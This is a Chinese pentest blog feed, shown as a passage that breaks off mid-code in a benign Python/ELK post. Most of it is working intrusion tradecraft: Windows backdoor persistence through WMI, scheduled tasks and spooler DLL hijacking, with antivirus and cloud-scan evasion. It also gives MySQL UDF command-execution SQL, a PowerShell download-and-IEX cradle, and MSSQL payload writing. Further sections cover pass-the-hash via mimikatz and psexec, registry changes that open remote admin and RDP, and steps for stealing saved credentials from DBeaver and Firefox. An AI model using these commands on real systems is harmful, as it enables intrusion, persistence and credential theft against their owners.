title="Windows后门的设置"></a>Windows后门的设置</h4><p>除去最常见的计划任务，剩下的是一堆注册表，如果存在360之类的话，是比较难处理的。其中有一个<code>WMI</code>，很奇怪各个杀软的拦截都不是太积极。</p><p>在实际测试中，如果留的后门是服务器，那么后门必须是定时启动，如果是个人电脑，那么是在特定的时间内启动。注意这个时间点的设置。</p><p>在Windows上面，最后留下2个以上的后门。一个exe，一个dll劫持，dll劫持我在github上面放了两个方式，推荐使用spooler，因为它默认权限最高，每个电脑都是开机启动。</p><h3 id="后门的形式"><a href="#后门的形式" class="headerlink" title="后门的形式"></a>后门的形式</h3><h4 id="Windows的System权限"><a href="#Windows的System权限" class="headerlink" title="Windows的System权限"></a>Windows的System权限</h4><ul><li>wmi开机启动和定时启动</li><li>计划任务</li><li>spooler的Dll劫持</li></ul><h4 id="Windows的User权限"><a href="#Windows的User权限" class="headerlink" title="Windows的User权限"></a>Windows的User权限</h4><ul><li>msdtc的dll劫持</li></ul><h4 id="Windows的Network权限"><a href="#Windows的Network权限" class="headerlink" title="Windows的Network权限"></a>Windows的Network权限</h4><ul><li>Redis的Dll劫持</li></ul><h4 id="云查杀的绕过"><a href="#云查杀的绕过" class="headerlink" title="云查杀的绕过"></a>云查杀的绕过</h4><p>之前在测试<code>Windows Defender</code>的时候，本来是免杀的exe，跑两三次之后就被杀了。百思不得其解，后来发现是云上传之后被查杀了，观察一下上线云查杀的机器，可以很容易的绕过。</p><p>再往后一点，考虑一下如果每个机器上线都是你动手来做的话，那么可以考虑写一个程序，为每一个被放后门的电脑生成一个唯一的hash值，这个hash值存放在shellcode加载服务器上面，shellcode执行之前先检查是否在数据库里面，这样是不是更完美的方式?</p><h3 id="后门的进阶"><a href="#后门的进阶" class="headerlink" title="后门的进阶"></a>后门的进阶</h3><ul><li><code>AES</code>动态加解密</li><li><code>Domain Fronting</code>隐藏存放<code>shellcode</code> </li><li><code>Domain Fronting</code>隐藏<code>C2</code> </li><li><code>shellcode</code>免杀的执行方式</li></ul><p>参考资料:</p><ul><li><a href="https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySql UDF提权注意事项</title>
      <link href="/2020/07/29/mysql-UDF.html"/>
      <url>/2020/07/29/mysql-UDF.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>[mysql-udf-exploitation]<a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p></blockquote><h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p><pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>结果如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>+----------------------+---------------------------+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>+----------------------+---------------------------+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>+----------------------+---------------------------+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>+-------------------------+--------+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>+-------------------------+--------+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span><span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p><p>可以在开启mysql的时候设置plugin的目录:</p><pre class="line-numbers language-none"><code class="language-none">指定目录:mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\指定配置文件:mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini配置文件包括如下内容:[mysqld]plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p><ul><li>@@datadir</li><li>@@basedir\bin</li><li>C:\windows</li><li>C:\windows\system</li><li>C:\windows\system32</li></ul><h3 id="上传UDF的文件"><a href="#上传UDF的文件" class="headerlink" title="上传UDF的文件"></a>上传UDF的文件</h3><h4 id="0x01-网络共享写文件"><a href="#0x01-网络共享写文件" class="headerlink" title="0x01 网络共享写文件"></a>0x01 网络共享写文件</h4><pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="0x02-十六进制"><a href="#0x02-十六进制" class="headerlink" title="0x02 十六进制"></a>0x02 十六进制</h4><pre class="line-numbers language-none"><code class="language-none">xxd -plain &#x2F;tmp&#x2F;udf.dll | tr -d &#39;\n&#39; &gt; &#x2F;tmp&#x2F;dll.hex 转换为16进制use mysql;set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);create table tmp(data LONGBLOB);insert into tmp values(&quot;&quot;);update tmp set data &#x3D; @a;select data from tmp into DUMPFILE &lt;dir&gt;;create function sys_eval returns string soname &#39;sys_eval.dll&#39;;drop table tmp;drop function sys_eval; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x03-网络共享-16进制"><a href="#0x03-网络共享-16进制" class="headerlink" title="0x03 网络共享+16进制"></a>0x03 网络共享+16进制</h4><pre class="line-numbers language-none"><code class="language-none">load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39; into table temp fields terminated by &#39;@OsandaMalith&#39; lines terminated by &#39;@OsandaMalith&#39; (data);select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x04-base64写入"><a href="#0x04-base64写入" class="headerlink" title="0x04 base64写入"></a>0x04 base64写入</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;先转换为base64;select to_base64(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.b64&#39;;&#x2F;&#x2F;再写入:select from_base64(&quot;TVqQAAMAAAAEAAAAA&quot;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;或者写入到大表里面，再写入到文件:select from_base64(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>msf自带的udf提供的几个函数，主要用到的是<code>sys_eval</code>和<code>sys_exec</code>,实测<code>sys_exec</code>会把mysql崩溃，可能创建的时候返回了string，建议使用<code>sys_eval</code>:</p><h4 id="sys-exec"><a href="#sys-exec" class="headerlink" title="sys_exec"></a>sys_exec</h4><pre class="line-numbers language-none"><code class="language-none">创建函数:create function sys_exec returns int soname &#39;udf.dll&#39;;确定是否成功:select * from mysql.func where name &#x3D; &#39;sys_exec&#39;;删除函数:drop function sys_exec;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-eval"><a href="#sys-eval" class="headerlink" title="sys_eval"></a>sys_eval</h4><pre class="line-numbers language-none"><code class="language-none">创建函数:create function sys_eval returns string soname &#39;udf.dll&#39;;确定是否成功:select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;删除:drop function sys_eval;使用:select sys_eval(&#39;dir&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-get"><a href="#sys-get" class="headerlink" title="sys_get"></a>sys_get</h4><pre class="line-numbers language-none"><code class="language-none">create function sys_get returns string soname &#39;udf.dll&#39;;Drop function sys_get;&#x2F;&#x2F;获取环境变量Select sys_get(&#39;longonserver&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>I noticed that these external UDF functions do not have proper exception handling in the dissembled code. Hence, a slightest mistake while calling these functions will lead the mysqld.exe server to crash. I hope this article might be useful to you while pentesting MySQL.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Com Object</title>
      <link href="/2020/07/16/Com-Object-Pentest-Note2.html"/>
      <url>/2020/07/16/Com-Object-Pentest-Note2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p></blockquote><p>我就瞎写了:</p><p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))$Instance.Connect()$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)$Task &#x3D; $Instance.NewTask(0)$Trigger &#x3D; $Task.triggers.Create(0)$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;$Trigger.Enabled &#x3D; $True$Trigger.Id &#x3D; $Taskname$Action &#x3D; $Task.Actions.Create(0)$Action.Path &#x3D; “cmd.exe”$Action.Arguments &#x3D; “&#x2F;c whoami”$Action.HideAppWindow &#x3D; $True$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)function Convert-Date &#123;               param(             [datetime]$Date        )               PROCESS &#123;               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;        &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透流水账</title>
      <link href="/2020/05/14/workgroup-pentest2.html"/>
      <url>/2020/05/14/workgroup-pentest2.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol><li>Linux主机www权限</li><li>主机无法出外网</li><li>正向代理无法使用</li><li>B段内网</li></ol><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p><pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p><pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号使用scan查看keys: scan 0 match * count 100 查看类型: type &lt;key&gt;hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p><pre class="line-numbers language-none"><code class="language-none">select @@plugin_dir;select hello into outfile &lt;plugin_dir&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后使用msf的自带的udf，先转换为16进制，然后导出到插件目录:</p><pre class="line-numbers language-none"><code class="language-none">use test;set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);create table Ghost(data LONGBLOB);insert into Ghost values(&quot;&quot;);update Ghost set data &#x3D; @a;select data from Ghost into DUMPFILE &lt;dir&gt;;create function sys_eval returns string soname &#39;sys_eval.dll&#39;;drop function sys_eval; &#x2F;&#x2F;用完删除，养成好习惯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>首选sys_eval, 尽量不要使用sys_exec(会崩溃)</code></strong></p><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>mssql爆破尽量放在后面执行，动静会比较大。</p><pre class="line-numbers language-none"><code class="language-none">mssql爆破成功之后，最好使用CLR来获取权限，直接使用&#96;xp_cmdshell&#96;会死翘翘,360会拦截<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>已知mssql的用户密码，certutil等工具会被拦截或者报警，可以使用mssql自带的工具写入到硬盘：</p><p>现开启存储过程:</p><pre class="line-numbers language-none"><code class="language-none">sp_configure &#39;show advanced options&#39;, 1;  GO  RECONFIGURE;  GO  sp_configure &#39;Ole Automation Procedures&#39;, 1;  GO  RECONFIGURE;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="mssql写大文件"><a href="#mssql写大文件" class="headerlink" title="mssql写大文件"></a>mssql写大文件</h5><p>比如exe之类的先转换为hex,然后再写入到文件:</p><p><code>xxd -plain /tmp/test.exe | tr -d &#39;\n&#39; &gt; /tmp/dll.hex</code></p><pre class="line-numbers language-none"><code class="language-none">declare @hexstring varchar(max);set @hexstring &#x3D; &#39;转换之后的hex&#39;;declare @file varbinary(max);set @file &#x3D; (select cast(&#39;&#39; as xml).value(&#39;xs:hexBinary( substring(sql:variable(&quot;@hexstring&quot;), sql:column(&quot;t.pos&quot;)) )&#39;, &#39;varbinary(max)&#39;)from (select case substring(@hexstring, 1, 2) when &#39;0x&#39; then 3 else 0 end) as t(pos));select @file;declare @init int;declare @filepath nvarchar(4000) &#x3D; N&#39;c:\22.exe&#39;;EXEC sp_OACreate &#39;ADODB.Stream&#39;, @init OUTPUT; -- An instace createdEXEC sp_OASetProperty @init, &#39;Type&#39;, 1;EXEC sp_OAMethod @init, &#39;Open&#39;; -- Calling a methodEXEC sp_OAMethod @init, &#39;Write&#39;, NULL, @file; -- Calling a methodEXEC sp_OAMethod @init, &#39;SaveToFile&#39;, NULL, @filepath, 2; -- Calling a methodEXEC sp_OAMethod @init, &#39;Close&#39;; -- Calling a methodEXEC sp_OADestroy @init; -- Closed the resources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="mssql备份"><a href="#mssql备份" class="headerlink" title="mssql备份"></a>mssql备份</h4><pre class="line-numbers language-none"><code class="language-none">BACKUP DATABASE &lt;db&gt;TO DISK &#x3D; &#39;C:\Windows\temp\db.bak&#39; WITH COMPRESSION, INIT, STATS &#x3D; 5;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>分卷压缩</li></ul><pre class="line-numbers language-none"><code class="language-none">rar.exe a -m0 -v100m C:\windows\temp\db.split C:\windows\tasks\db.bakdownload C:\\windows\\temp\\db.split.rar &#x2F;var&#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h4><ul><li>wmi</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.1.158 &#x2F;user:pt007 &#x2F;password:admin123  process call create &quot;cmd.exe &#x2F;c ipconfig&gt;d:\result.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>推荐使用wmiexec.vbs:</p><p><a href="https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs">https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript C:\Windows\Tasks\aliwmi.vbs &#x2F;cmd &lt;ip&gt;  &quot;C:\Windows\system32\calc.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>msf</li></ul><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec show optionsset RHOST 192.168.81.129set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BFset SMBUser Administratorshow optionsrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>mimikatz || Cobalt Strike</li></ul><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;sekurlsa::pth &#x2F;domain:. &#x2F;user:administrator &#x2F;ntlm:2D20D252A479F485CDF5E171D93985BF &#x2F;run:cmd.exe&quot; &#x2F;&#x2F;传递hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>psexec</li></ul><pre class="line-numbers language-none"><code class="language-none">psexec &#x2F;accepteula &#x2F;&#x2F;接受许可协议sc delete psexesvcpsexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>psexec.vbs</li></ul><pre class="line-numbers language-none"><code class="language-none">cscript psexec.vbs 192.168.1.158 pt007 admin123 &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>远程命令执行sc</li></ul><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.17.138\c$ &quot;admin123&quot; &#x2F;user:pt007net usedir \\192.168.17.138\c$copy test.exe \\192.168.17.138\c$sc \\192.168.17.138 create test binpath&#x3D; &quot;c:\test.exe&quot;sc \\192.168.17.138 start testsc \\192.168.17.138 del test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>windows远程执行cmd的9种方法: <a href="https://xz.aliyun.com/t/5957">https://xz.aliyun.com/t/5957</a></p><h3 id="access-is-denied"><a href="#access-is-denied" class="headerlink" title="access is denied"></a>access is denied</h3><p>对于任何非RID 500的本地管理员(Administrator)连接到Windows Vista+的计算机，无论采用wmi、psexec还是其它方法，使用的令牌都是中等令牌, 使用wmiexec的时候会修暗示Access is Denied</p><p>在抓取hash的情况下，可以修改注册表，使得本地管理员组成员都可以远程连接,作为一种持久化的手段。</p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>###RDP的PTH<br>抓取hash无法破解的情况下，如果使用hash远程登录RDP，需要被登录的系统开启”Restricted Admin Mode”, 在Windows8.1和Windows Server 2012R2上默认开启。Windows7和WinServer 2008需要安装2871997、2973351布丁。</p><h4 id="启动RDP"><a href="#启动RDP" class="headerlink" title="启动RDP"></a>启动RDP</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;fREG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f  # 监听 3389 端口 开启3389wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开启Restricted-Admin-mode"><a href="#开启Restricted-Admin-mode" class="headerlink" title="开启Restricted Admin mode"></a>开启Restricted Admin mode</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="增加防火墙规则"><a href="#增加防火墙规则" class="headerlink" title="增加防火墙规则"></a>增加防火墙规则</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; dir&#x3D;in protocol&#x3D;TCP localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dump-passwod"><a href="#dump-passwod" class="headerlink" title="dump passwod"></a>dump passwod</h3><p>####dbeaver</p><p>dbeaver6的配置文件(不同版本存储的位置和解密方式不一样):</p><pre class="line-numbers language-none"><code class="language-none">#密码加密存储位置:C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\credentials-config.json#url和用户名:C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\data-sources.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密脚本: <a href="https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61">https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61</a></p><p>下载<code>credentials-config.json</code>脚本之后，使用python解密:<code>python decrypt.py credentials-config.json</code>，然后根据解密出来的id去<code>data-sources.json</code>里面找对应的IP和用户名。</p><p>老版本的密码是存储在:<code>C:\Users\&lt;users&gt;\.dbeaver4\General\.dbeaver-data-source.xml</code>，可以直接使用在线解密:<a href="http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/">http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/</a></p><h3 id="MobaXterm"><a href="#MobaXterm" class="headerlink" title="MobaXterm"></a>MobaXterm</h3><p>有一个<code>.ini</code>的文件，有对应的IP信息和私钥地址<br>老版本的存储: C:\Users%USERNAME%\AppData\Roaming\MobaXterm<br>2020年的版本: C:\Users%USERNAME%\Documents\MobaXterm</p><h3 id="VSCODE"><a href="#VSCODE" class="headerlink" title="VSCODE"></a>VSCODE</h3><p>Windows下的配置文件在这个地方:</p><pre class="line-numbers language-none"><code class="language-none">%APPDATA%\Code\User\settings.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以根据配置文件找到笔记和ssh等存储位置</p><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>三好师傅讲的很详细，我选择使用firepwd.py:</p><pre class="line-numbers language-none"><code class="language-none">firefox的配置文件目录:%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\下载解密需要的文件:key4.db和logins.json下载解密脚本:https:&#x2F;&#x2F;github.com&#x2F;lclevy&#x2F;firepwd上面三个东西放在一个文件夹:python3 firepwd.py <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p><h3 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h3><ol><li>CS里面的<code>screenshot</code></li><li>msf里面: <code>use espia</code> <code>screengrab</code></li><li>msf的持续截屏: <code>post/windows/gather/screen_spy</code></li><li>Win10自带: <code>psr.exe /start /gui 0 /output C:\cool.zip /maxlogsize 1</code></li></ol><h3 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h3><pre class="line-numbers language-none"><code class="language-none">在C盘搜索script.js这个文件:dir &#x2F;s &#x2F;b C:\script.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python处理xlsx到ELK</title>
      <link href="/2020/05/06/python-elk.html"/>
      <url>/2020/05/06/python-elk.html</url>
      
        <content type="html"><![CDATA[<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token comment">#cell = date.strftime('%Y/%m/%d 